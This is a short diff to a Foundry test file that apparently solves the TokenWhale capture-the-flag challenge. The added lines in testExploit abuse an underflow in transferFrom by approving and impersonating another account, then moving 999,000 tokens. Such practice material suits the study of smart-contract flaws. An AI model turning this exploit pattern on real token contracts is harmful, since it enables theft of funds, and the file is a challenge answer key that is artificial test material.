@@ -24,6 +24,14 @@ contract TokenWhaleTest is Test {
     function testExploit() public {
         // Put your solution here
 
+        tokenWhale.approve(Pete, 1);
+
+        vm.startPrank(Pete);
+        tokenWhale.transferFrom(address(this), address(this), 1);
+        tokenWhale.transfer(address(this), 999_000);
+
+        vm.stopPrank();
+
         _checkSolved();
     }
 
